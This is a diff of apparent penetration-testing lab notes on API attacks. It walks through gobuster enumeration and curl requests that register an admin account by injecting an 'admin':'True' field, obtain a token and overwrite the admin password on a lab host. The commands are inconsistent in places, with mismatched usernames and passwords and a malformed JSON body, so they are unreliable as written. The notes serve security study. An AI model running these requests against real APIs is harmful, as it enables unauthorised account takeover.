@@ -105,7 +105,7 @@ Conventional tools like 'gobuster' can be used to identify API endpoints, which 
 # {GOBUSTER}/v1
 # {GOBUSTER}/v2
 
-gobuster dir -u <IP> -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
+gobuster dir -u <IP:PORT> -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
 
 # this returns results that follow this function
 
@@ -119,23 +119,54 @@ We can inspect the API by using the curl function:
 ~~~ bash
 
 # the '-i' parameter includes the http headers in the response
-curl -i https://<IP>/users/v1
+curl -i https://<IP:PORT>/users/v1
 
 # this can return a list of users which can be brute-forced
 # it returns several usernames including 'admin'
 
 # with this additional username information known, we can try to breute-force the username component of the api
 
-gobuster dir -u https://<IP>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
+gobuster dir -u https://<IP:PORT>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
 
 # this returns additional api information, including 'email' and 'password'
 
-curl -i https://<IP>/users/v1/admin/password
+curl -i https://<IP:PORT>/users/v1/admin/password
 
 # this results in a '405 method not allowed'.  This suggests that the endpoint exists.  By default, the curl command uses the 'GET' method (which is not allowed).  
+~~~
 
+We can use a different HTTP method to see if we can authenticate the known 'admin' username.
+
+~~~ bash
+# use the HTTP POST method to try to authenticate a known 'admin' unsername and a test 'password' to see what the response is
+
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type:application/json' http://192.168.50.16:5002/users/v1/login
+
+# -d uses the post method to pass the json login data
+# -H HTTP header to specify that 'application/json' is being passed to the api
+# the ip address, port and end point
+
+# the response confirms that the json format, username and api are available and that the password is not correct.  We will now try to create a new users using the same api with a different endpoint (register)
+
+curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json' <IP:PORT>/users/v1/register
+
+# this api call responds with an error message indicating that the register process requires an email to be provided
+
+curl -d '{"password":"fake", "email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://<IP:PORT>/users/v1/register
+
+# this call successfully registers an account and instructs the new user to login to receive an 'authentication token'.  We can now try to login with the new credentials
+
+curl -d '{"password":"lab", "username":"offsec}' -H 'Content-Type: application/json' <IP:PORT>/users/v1/login
+
+# an authenticate token is provided.  We can now check that we have administratve access by changing the admin password
+
+curl \ 'http://<IP:PORT>/users/v1/admin/password' \ -H 'Content-Type: application/json' \ -H 'Authorization: OAuth <token>' \ -d '{"password": "pwned"}'
+
+# the authorization token is passed within the 'Authorization' header along with the new password
 
 ~~~
+
+This method (curl) is useful for single apis, however, it doesn't scale efficiently.  We can replicate this in 'Burp-Suite'. 
 ## Tags
 #enumeration
 #nmap 
